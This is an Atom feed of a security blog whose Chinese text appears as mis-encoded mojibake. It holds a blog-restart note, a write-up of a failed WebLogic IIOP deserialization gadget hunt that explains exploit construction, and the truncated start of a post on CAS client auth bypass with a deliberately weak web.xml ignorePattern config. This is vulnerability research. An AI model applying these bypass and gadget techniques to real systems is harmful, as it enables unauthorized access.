<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æä¸‰çš„å‰‘è°±</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cl0und.github.io/"/>
  <updated>2024-08-11T09:33:24.397Z</updated>
  <id>https://cl0und.github.io/</id>
  
  <author>
    <name>æä¸‰ï¼ˆcl0undï¼‰</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>åšå®¢é‡å¯å°è®°ï¼ˆ2ï¼‰</title>
    <link href="https://cl0und.github.io/2024/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/"/>
    <id>https://cl0und.github.io/2024/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/</id>
    <published>2024-12-22T08:44:49.000Z</published>
    <updated>2024-08-11T09:33:24.397Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰ä¸¤å¹´å¤šå¹´æ²¡æœ‰å†™åšå®¢äº†ï¼Œæœ€è¿‘ä¸€æ¬¡å†™çš„è¯é¢˜è¿˜æ˜¯weblogic RCEæŒ–æ˜ ã€Šè®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜ã€‹ã€‚è™½ç„¶å½“æ—¶å†™çš„æ—¶å€™æ ‡é¢˜æ˜¯â€œå¤±è´¥çš„â€ï¼Œä½†å…¶å®åé¢ç¡®å®å¯å‘äº†å¦ä¸€ä½å¸ˆå‚…æ‹¿åˆ°äº†RCE ï¼ˆCVE-2022-21420ï¼‰ã€‚æˆ‘è¦æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼Œä¸ä½†å› ä¸ºå®ƒæŒ½æ•‘äº†è¿™æ¬¡å¤±è´¥çš„åˆ©ç”¨ï¼Œè¿˜å› ä¸ºå®ƒæ€»æ˜¯åœ¨è¿‡å¹´çš„æ—¶å€™ç»™æˆ‘å‘çº¢åŒ…ï¼Œæ‰‹åŠ¨ç‹—å¤´ã€‚</p><p>å®‰å…¨ç ”ç©¶ä¸€é—¨è‰ºæœ¯ï¼Œæ˜¯å®ˆæ­£å‡ºå¥‡ï¼Œæ˜¯æ¨é™ˆå‡ºæ–°ï¼Œæ˜¯å¯¹åˆ›é€ åŠ›çš„ç£¨ç»ƒã€‚æœ‰ä¸€èµ·ç ”ç©¶æŠ€æœ¯çš„å°ä¼™ä¼´æ˜¯å¹¸ç¦çš„ï¼Œæ„Ÿè°¢å¤§å­¦å››å¹´èƒ½é‡åˆ°Sycloverå°ç»„ã€‚</p><p>æ¯•ä¸šåå»äº†ä¸Šæµ·ï¼Œåˆè¾—è½¬é¦™æ¸¯ï¼Œå¦‚ä»Šä¸Šå¡ä¸¤å¹´äº†ï¼Œå‡†å¤‡ç¬¬äºŒæ¬¡é‡å¯æˆ‘çš„åšå®¢ã€‚æœªæ¥å‡†å¤‡æ›´æ–°ä¸€äº›å­¦ä¹ binaryå’Œdistributed systemçš„å­¦ä¹ ç¬”è®°ã€‚</p><p>ä¹‹å‰redteam.todayåŸŸåå·²ç»è¢«åˆ«äººä¹°èµ°ï¼Œä»¥åæ‰“ç®—é•¿æœŸç”¨cl0und.github.ioäº†ã€‚çœ‹åˆ°åšå®¢å‹é“¾ä¸­èƒ½æ­£å¸¸è®¿é—®çš„å·²ç»æ‰€å‰©æ— å‡ ï¼Œè¿™æ›´è®©æˆ‘åˆ°ä½“ä¼šé•¿æœŸå†™åšå®¢çš„ä¸æ˜“ã€‚å¸Œæœ›è¿™æ¬¡æˆ‘èƒ½åšæŒå¾—æ›´ä¹…ä¸€äº›ğŸ˜†</p><p>é¡ºé¢‚å¤å®‰ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ‰ä¸¤å¹´å¤šå¹´æ²¡æœ‰å†™åšå®¢äº†ï¼Œæœ€è¿‘ä¸€æ¬¡å†™çš„è¯é¢˜è¿˜æ˜¯weblogic RCEæŒ–æ˜ ã€Šè®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜ã€‹ã€‚è™½ç„¶å½“æ—¶å†™çš„æ—¶å€™æ ‡é¢˜æ˜¯â€œå¤±è´¥çš„â€ï¼Œä½†å…¶å®åé¢ç¡®å®å¯å‘äº†å¦ä¸€ä½å¸ˆå‚…æ‹¿åˆ°äº†RCE ï¼ˆCVE-2022-21420ï¼‰ã€‚æˆ‘è¦æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼Œä¸ä½†å› ä¸ºå®ƒæŒ½æ•‘äº†è¿™æ¬¡å¤±è´¥çš„åˆ©ç”¨ï¼Œè¿˜å› ä¸ºå®ƒæ€»æ˜¯åœ¨è¿‡å¹´çš„æ—¶å€™ç»™æˆ‘å‘çº¢åŒ…ï¼Œæ‰‹åŠ¨ç‹—å¤´ã€‚&lt;/p&gt;
&lt;p&gt;å®‰å…¨ç ”ç©¶ä¸€é—¨è‰ºæœ¯ï¼Œæ˜¯å®ˆæ­£å‡ºå¥‡ï¼Œæ˜¯æ¨é™ˆå‡ºæ–°ï¼Œæ˜¯å¯¹åˆ›é€ åŠ›çš„ç£¨ç»ƒã€‚æœ‰ä¸€èµ·ç ”ç©¶æŠ€æœ¯çš„å°ä¼™ä¼´æ˜¯å¹¸ç¦çš„ï¼Œæ„Ÿè°¢å¤§å­¦å››å¹´èƒ½é‡åˆ°Sycloverå°ç»„ã€‚&lt;/p&gt;
&lt;p&gt;æ¯•ä¸šåå»äº†ä¸Šæµ·ï¼Œåˆè¾—è½¬é¦™æ¸¯ï¼Œå¦‚ä»Šä¸Šå¡ä¸¤å¹´äº†ï¼Œå‡†å¤‡ç¬¬äºŒæ¬¡é‡å¯æˆ‘çš„åšå®¢ã€‚æœªæ¥å‡†å¤‡æ›´æ–°ä¸€äº›å­¦ä¹ binaryå’Œdistributed systemçš„å­¦ä¹ ç¬”è®°ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å‰redteam.todayåŸŸåå·²ç»è¢«åˆ«äººä¹°èµ°ï¼Œä»¥åæ‰“ç®—é•¿æœŸç”¨cl0und.github.ioäº†ã€‚çœ‹åˆ°åšå®¢å‹é“¾ä¸­èƒ½æ­£å¸¸è®¿é—®çš„å·²ç»æ‰€å‰©æ— å‡ ï¼Œè¿™æ›´è®©æˆ‘åˆ°ä½“ä¼šé•¿æœŸå†™åšå®¢çš„ä¸æ˜“ã€‚å¸Œæœ›è¿™æ¬¡æˆ‘èƒ½åšæŒå¾—æ›´ä¹…ä¸€äº›ğŸ˜†&lt;/p&gt;
&lt;p&gt;é¡ºé¢‚å¤å®‰ã€‚&lt;/p&gt;

    
    </summary>
    
    
    
      <category term="æ‚" scheme="https://cl0und.github.io/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜</title>
    <link href="https://cl0und.github.io/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/"/>
    <id>https://cl0und.github.io/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/</id>
    <published>2022-04-08T02:19:00.000Z</published>
    <updated>2022-04-08T02:44:51.040Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>å½“æ—¶ä»¥ä¸ºæŒ–æˆåŠŸäº†ï¼Œç»“æœåæ¥å‘ç°æ˜¯å°‘æ‰“äº†ä¸€ä¸ªè¡¥ä¸ï¼Œåœ¨æœ‹å‹åœˆè™šæ™ƒäº†ä¸€æªã€‚ä¸è¿‡æ•´ä¸ªåˆ©ç”¨æ€è·¯è¿˜ç®—æœ‰è¶£ï¼Œè¿™å¹¶ä¸å¦¨ç¢åœ¨è¿™é‡Œåˆ†äº«ä¸€ä¸‹ã€‚</p><h2 id="sinkç‚¹å¯è¡Œæ€§éªŒè¯"><a href="#sinkç‚¹å¯è¡Œæ€§éªŒè¯" class="headerlink" title="sinkç‚¹å¯è¡Œæ€§éªŒè¯"></a>sinkç‚¹å¯è¡Œæ€§éªŒè¯</h2><p>å¼€å±€é£å¹²å¸ˆå‚…é€äº†ä¸ªsinkç‚¹ã€‚</p><p><img src="image-20220304173625-rfymfzd.png" alt="image.png"></p><p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹sinkç‚¹com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#putçš„å¯è¡Œæ€§ã€‚</p><p><img src="image-20220304173841-084s55s.png" alt="image.png"></p><p>å¦‚æœè¿™é‡Œthis.m_contextæ˜¯ReplicatedCache$BackingMapContextï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¿›å…¥BackingMapContext#getValueFromInternalConverterå†è¿›å…¥getConverterFromInternalã€‚</p><p><img src="image-20220304174359-croe38f.png" alt="image.png"></p><p>å› ä¸ºthis.__m_ConverterFromInternalä¸ºtransientåœ¨ååºåˆ—çš„æ—¶å€™ä¸ºç©ºï¼Œæ ¹æ®ä»£ç é€»è¾‘ååºåˆ—åŒ–çš„æ—¶å€™ä¼šåˆ›ä¸€ä¸ªæ–°çš„converterï¼Œå¹¶è°ƒç”¨convertæ–¹æ³•è½¬æ¢å—æ§çš„oValçš„å¯¹è±¡ã€‚</p><p><img src="image-20220304174728-h7fb6qs.png" alt="image.png"></p><p>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œçœ‹ä¸€ä¸‹converteræ˜¯ä»€ä¹ˆæ ·å­çš„, converterç±»å‹å›ºå®šReplicatedCache$ConverterFromInternalã€‚</p><p><img src="image-20220304175214-4sf1oh8.png" alt="image.png"></p><p>ReplicatedCache$ConverterFromInternalçš„convertã€‚</p><p><img src="image-20220304175319-iu49dix.png" alt="image.png"></p><p>æ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿæ²¡é”™ï¼Œ<a href="https://xz.aliyun.com/t/9068">æ˜¯æˆ‘å»å¹´æŒ–weblogicçš„æ—¶å€™æ‰¾åˆ°çš„sinkç‚¹</a>, äºŒé˜¶ååºåˆ—åŒ–ç±»å‹ã€‚</p><h2 id="è¡¥å…¨gadget"><a href="#è¡¥å…¨gadget" class="headerlink" title="è¡¥å…¨gadget"></a>è¡¥å…¨gadget</h2><p>é‚£ä¹ˆç°åœ¨éœ€è¦ä»sourceç‚¹æ‰¾ä¸€æ¡é€šè·¯ï¼Œæ”¾å…¥å¸¸è§çš„sourceç‚¹è‡ªåŠ¨åŒ–è·‘ï¼Œæ— å¥ˆå·¥å…·å¤ªèœï¼Œå¤§æµ·æé’ˆã€‚æåˆ°ä¸€ä¸ªï¼Œåº”è¯¥è¿˜æœ‰å…¶ä»–çš„ï¼Œæˆ‘æ²¡ä¸€ä¸ªä¸€ä¸ªçœ‹äº†ã€‚</p><p><img src="image-20220304225954-l24t1tq.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å†ç”¨BadAttributeValueExpExceptionå‰åŠæ®µå°±å®Œå…¨èµ°é€šäº†ã€‚</p><h2 id="æ„é€ expä¸javaassitçš„å¦™ç”¨"><a href="#æ„é€ expä¸javaassitçš„å¦™ç”¨" class="headerlink" title="æ„é€ expä¸javaassitçš„å¦™ç”¨"></a>æ„é€ expä¸javaassitçš„å¦™ç”¨</h2><p>è·¯å¾„æ‰¾åˆ°äº†æ¥ç€ï¼Œå°±æ˜¯å¡«å……ä¸€äº›å¿…è¦çš„æ¡ä»¶ï¼Œæ„é€ payloadäº†ã€‚</p><p>æ„é€ çš„æ—¶å€™ä¼šå‘ç°å¯¹com.tangosol.coherence.component.util.daemon.queueProcessor.Serviceæœ‰ä¾èµ–ã€‚è¿™ä¸ªç±»æ˜¯å®ç°äº†Serializableæ¥å£çš„ï¼Œä½†æ˜¯å®˜æ–¹çš„æœ¬æ„æ˜¯ä¸æƒ³è®©å®ƒè¢«åºåˆ—åŒ–çš„ï¼Œ</p><p><img src="image-20220304210431-375u930.png" alt="image.png"></p><p>ä¸è¿‡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰åšå¯¹åº”çš„æ£€æŸ¥ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨javaassitå¼ºè¡ŒæŠŠè¿™ä¸ªæ–¹æ³•æ”¹æˆ$1.defaultWriteObject();</p><p>ç±»ä¼¼çš„ï¼Œjavaassitçš„å¦™ç”¨è¿˜å¯ä»¥å‡è½»æ„é€ payloadæ—¶å€™çš„ç—›è‹¦ï¼Œæˆ‘ä»¬å¯ä»¥å®¡è®¡ä¸€éƒ¨åˆ†ä»£ç ï¼Œç”¨javaassitæŠŠæ²¡ç”¨çš„é€»è¾‘é˜‰å‰²æ‰ã€‚</p><p>ä¾‹å¦‚KeyBackingMapæ„é€ æ–¹æ³•ä¸­</p><p><img src="image-20220304211223-x6gne8z.png" alt="image.png"></p><p>context.getCacheService().getInfo().getServiceName(), ä¸€æ³¢è¿ç¯å¤ºå‘½callè¦æ­£å¸¸è¿è¡Œéœ€è¦å„ç§è¡¥å…¨æ¡ä»¶ï¼Œä¸€æ³¢æ“ä½œå°±ä¸ºäº†æ‹¿ä¸€ä¸ªæ²¡ä»€ä¹ˆåµç”¨çš„å­—ç¬¦ä¸²ã€‚</p><h2 id="å±±ç©·æ°´å°½ç–‘æ— è·¯"><a href="#å±±ç©·æ°´å°½ç–‘æ— è·¯" class="headerlink" title="å±±ç©·æ°´å°½ç–‘æ— è·¯"></a>å±±ç©·æ°´å°½ç–‘æ— è·¯</h2><p>è‡³æ­¤ä¸€åˆ‡éƒ½åœ¨å‘å¥½çš„æ–¹å‘å‘å±•ï¼Œé¦–å…ˆæˆ‘ç”¨æ²¡æ‰“è¡¥ä¸weblogicèµ°äº†ä¸€æ³¢t3ï¼Œä¸€å‘å…¥é­‚ï¼Œç¨³ç¨³çš„ã€‚æ‰“ä¸Šæœ€æ–°è¡¥ä¸åèµ°t3æ²¡æˆåŠŸï¼Œçœ‹æŠ¥é”™æƒ³èµ·äº†æ˜¯å»å¹´oracleç»™t3åŠ äº†ä¸€ä¸ªABBREV_CLASSESç™½åå•ã€‚</p><p><img src="image-20220304213624-3kn8um9.png" alt="image.png"></p><p>ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨iiopé‡æ‹³å‡ºå‡»ã€‚é•¿ä¹…ä»¥æ¥æˆ‘ä¸€ç›´è§‰å¾—t3å’Œiiopæ˜¯ç­‰ä»·çš„ä¸œè¥¿ï¼Œexpèµ°t3æˆåŠŸï¼Œé‚£èµ°iiopä¹Ÿå¯æˆåŠŸï¼Œå› æ­¤ä¸€ç›´è§‰å¾—å®˜æ–¹å•ç‹¬ç»™t3åŠ ç™½çš„æ“ä½œä¸å¤šä½™ä½†æ²¡å¿…è¦ã€‚</p><p>ç›´åˆ°æ‰“å®Œå‘ç°æ²¡æˆåŠŸï¼Œè¿™ä¸‹æœ‰ç‚¹å‚»çœ¼äº†ã€‚<br><img src="image-20220304213955-rx8vczj.png" alt="image.png"></p><p>çœ‹èµ·æ¥iiopå’Œt3åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯æœ‰ä¸åŒã€‚æ ¹æ®è°ƒç”¨æ ˆå’Œè°ƒè¯•å¯ä»¥å®šä½åˆ°å‡ºé”™registerMessageTypeä¸­çš„getMessageClassMapã€‚</p><p><img src="image-20220304221011-g7od395.png" alt="image.png"></p><p><img src="image-20220304221737-pc9vl4s.png" alt="image.png">)<img src="image-20220304221750-gjzcpbp.png" alt="image.png"></p><p>çœ‹åˆ°è¿™é‡Œä½ å¯èƒ½å……æ»¡ç–‘æƒ‘</p><ul><li>ååºåˆ—åŒ–ä¸æ˜¯å¯ä»¥æ§åˆ¶ä»»æ„æˆå‘˜å˜é‡ï¼ˆä¸ä¸¥è°¨ï¼‰å—ï¼Ÿæå‰ç»™__m_MessageClassMapè®¾ç½®å¥½ï¼Œä¸å°±å¯ä»¥è§„é¿ç©ºæŒ‡é’ˆçš„é—®é¢˜ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆt3çš„æ—¶å€™æ²¡æœ‰é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Ÿ</li></ul><p>è¿™é‡Œé™äºç¯‡å¹…ï¼Œæˆ‘å°±ç›´æ¥è¯´æˆ‘è°ƒè¯•çš„ç»“è®ºäº†ã€‚</p><p>å…³äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œç¡®å®å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œæ¶‰åŠååºåˆ—åŒ–æ—¶åºçš„é—®é¢˜ï¼Œå°±ç®—è®¾ç½®äº†__m_MessageClassMapï¼Œé€»è¾‘èµ°åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™æˆå‘˜å˜é‡è¿˜æ²¡æœ‰è¢«èµ‹å€¼ã€‚</p><p>å…³äºç¬¬äºŒä¸ªé—®é¢˜ï¼Œæ˜¯å› ä¸ºèµ°iiopæ—¶ï¼Œååºåˆ—åŒ–Componentæ—¶registerVaildationè°ƒç”¨æŠ›å‡ºå¼‚å¸¸äº†ï¼Œè¿›å…¥äº†t3æƒ…å†µä¸‹ä¸ä¼šè¿›å…¥çš„validateObjectã€‚</p><p><img src="image-20220304222857-dwd6vqx.png" alt="image.png"></p><p>è€Œå‡ºç°å¼‚å¸¸çš„åŸå› æ˜¯ä¹Ÿå°±æ˜¯depthä¸º0ã€‚</p><p><img src="image-20220304223120-g4g323u.png" alt="image.png"></p><p>é€šå¸¸æƒ…å†µä¸‹depthä¼šéšç€ååºåˆ—åŒ–æ—¶çš„æ·±åº¦åŠ¨æ€å˜åŒ–ï¼Œå› æ­¤æˆ‘çŒœå¼€å‘çš„æœ¬æ„æ˜¯ç¦æ­¢Componentæˆä¸ºæœ€å¤–å±‚çš„å¯¹è±¡ã€‚</p><p><img src="image-20220304223702-prcmt93.png" alt="image.png"></p><p>ä½†æ˜¯IIOPå› ä¸ºè‡ªèº«å®ç°çš„åŸå› ï¼Œè¿›å…¥äº†readObjectOverrideï¼Œä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰è¿›å…¥readObject0ã€‚ä¹Ÿå°±è¯´æ•´ä¸ªè¿‡ç¨‹depthä¸€ç›´ä¸º0ã€‚</p><p><img src="image-20220304224620-r2flbv8.png" alt="image.png"></p><p>è‡³æ­¤æƒ…å†µå˜å¾—å¾ˆéš¾å—ã€‚t3ç™½åå•æ‰“ä¸äº†ï¼Œiiopå› ä¸ºè¿™ä¸ªgadgetä¾èµ–äº†ç‰¹æ®Šçš„ç±»ä¹Ÿæ‰“ä¸äº†ã€‚åŠŸè´¥å‚æˆï¼Œæˆ‘å½“æ—¶è§‰å¾—éå¸¸å¯æƒœã€‚åˆæŠ˜è…¾ä¸€ä¼šæ‰¾ä¸åˆ°æ›¿ä»£ç±»å°±æ”¾å¼ƒäº†ã€‚</p><h2 id="æŸ³å²¸èŠ±æ˜åˆä¸€æ‘"><a href="#æŸ³å²¸èŠ±æ˜åˆä¸€æ‘" class="headerlink" title="æŸ³å²¸èŠ±æ˜åˆä¸€æ‘"></a>æŸ³å²¸èŠ±æ˜åˆä¸€æ‘</h2><p>å¤§çº¦è¿‡äº†ä¸‰å‘¨ä¹‹åï¼Œæˆ‘åˆæƒ³èµ·äº†è¿™ä¸ªæ´ï¼Œçªç„¶eurekaã€‚æ—¢ç„¶æ­£å¸¸æµèƒ½æ‰“iiopä¸èƒ½æ‰“ï¼Œé‚£èƒ½ä¸èƒ½æŠŠiiopâ€œè½¬æ¢â€æˆæ­£å¸¸æµç„¶åå†æ‰“å‘¢ï¼Ÿ</p><p>å…¶å®é€šè¿‡æŸ¥çœ‹<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">å†å²æ¼æ´</a>å¯ä»¥çŸ¥é“CVE-2016-3510å°±å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><p><img src="image-20220306223053-llrmlnj.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œå…¨é“¾è·¯å·²ç»æ‰“é€šã€‚</p><h2 id="ä¸ºä»€ä¹ˆå¤±è´¥"><a href="#ä¸ºä»€ä¹ˆå¤±è´¥" class="headerlink" title="ä¸ºä»€ä¹ˆå¤±è´¥"></a>ä¸ºä»€ä¹ˆå¤±è´¥</h2><p>äº¤ç»™å®˜æ–¹ä¹‹åè¢«é©³å›äº†ï¼Œåæ¥å‘ç°æµ‹è¯•çš„æ—¶å€™å°‘äº†ä¸€ä¸ªè¡¥ä¸ã€‚</p><p>æ‰“è¡¥ä¸å‰ï¼š</p><p><img src="image-20220314134013-liz2r0c.png" alt="image.png"></p><p>æ‰“è¡¥ä¸åï¼š</p><p>è¿™é‡Œthis.setFilteré»˜è®¤ä¸ºtrueï¼Œä¹Ÿå°±è¯´ä»2021çš„æŸä¸€æ¬¡è¡¥ä¸ä¹‹åfromBinaryè¿™ä¸ªç‚¹åŠ äº†é»‘åå•å·²ç»æ‰“ä¸äº†ã€‚</p><p><img src="image-20220314135356-eyrxbug.png" alt="image.png"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è™½ç„¶æ ¹æ®CVE-2016-3510ï¼Œiiopå’Œt3åœ¨æ¼æ´åˆ©ç”¨ä¸Šå·²ç»å®Œå…¨ç­‰ä»·äº†ã€‚t3ç™½ä¸ç™½å·²ç»ä¸é‡è¦äº†ï¼Œä½†t3ç™½åå•çœŸçš„æ— æ³•ç»•è¿‡å—ï¼Ÿå…¶å®æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™é‡Œç©ºç™½å¤ªå°å†™ä¸ä¸‹â€¦â€¦</p>]]></content>
    
    <summary type="html">
    
      Introduce some insteresting tricks of building exp.
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Two Tricks Of CAS-CLIENT AUTH Bypass</title>
    <link href="https://cl0und.github.io/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/"/>
    <id>https://cl0und.github.io/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/</id>
    <published>2021-08-31T12:56:13.000Z</published>
    <updated>2021-08-31T13:16:36.232Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/9557">å…ˆçŸ¥ç¤¾åŒº</a></p><!-- more --><p>cas client ç”¨äºé™åˆ¶åŒ¿åç”¨æˆ·å¯¹æŸäº›ç‰¹å®šapiçš„è®¿é—®ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šçš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šæœ‰æƒé™ç»•è¿‡é—®é¢˜ã€‚ä¸‹é¢åˆ†äº«ä¸¤ä¸ªå®é™…ç”Ÿæ´»ä¸­é‡åˆ°çš„æ¡ˆä¾‹ã€‚</p><h2 id="bypass-trick1-ignorePattern"><a href="#bypass-trick1-ignorePattern" class="headerlink" title="bypass trick1 ignorePattern"></a>bypass trick1 ignorePattern</h2><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>/api/adminè¿™ä¸ªurlæ˜¯éœ€è¦casç™»é™†æ‰èƒ½è®¿é—®çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/api/admin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/api/guestè¿™ä¸ªæ˜¯å…¬å…±é¡µé¢ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥çœ‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GuestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/api/guest"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">guest</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello guest"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡è®¾æ­¤ç¨‹åºçš„æŠ€æœ¯æ¯”è¾ƒè€æ—§ï¼Œä¸ºäº†å®ç°ä¸Šé¢è¿™ç§éœ€æ±‚ï¼Œé‚£ä¹ˆå¼€å‘å¯èƒ½ä¼šåœ¨web.xmlä¸­è¿™ä¹ˆé…ç½®ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://battags.ad.ess.rutgers.edu:8443/cas<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://www.acme-client.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/api/guest<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span 